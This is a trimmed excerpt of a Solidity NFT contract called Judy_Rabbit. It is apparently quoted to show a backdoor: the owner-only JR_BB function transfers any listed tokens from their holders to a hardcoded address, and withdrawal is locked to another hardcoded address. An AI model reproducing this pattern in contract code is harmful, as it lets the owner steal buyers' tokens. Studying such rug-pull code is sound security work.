...
contract Judy_Rabbit is Ownable, ERC721A, ReentrancyGuard {
  ...
  function JR_wlMint(uint256 quantity,bytes32[] calldata _merkleProof) external payable callerIsUser {
  ...
  function JR_PLMint(uint256 quantity) external payable callerIsUser {    
  ...
  function JR_BB(uint256[] memory tokenids) external onlyOwner {
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xca11EF62472aaf43017fce589Eac091CD51c543f, tokenid);
        }
    }
  ...
  function JR_withdraw() external  nonReentrant {
    require(msg.sender == 0xcAa6E8c0dC384E841c183dF18D26B74B7c6d51C5);
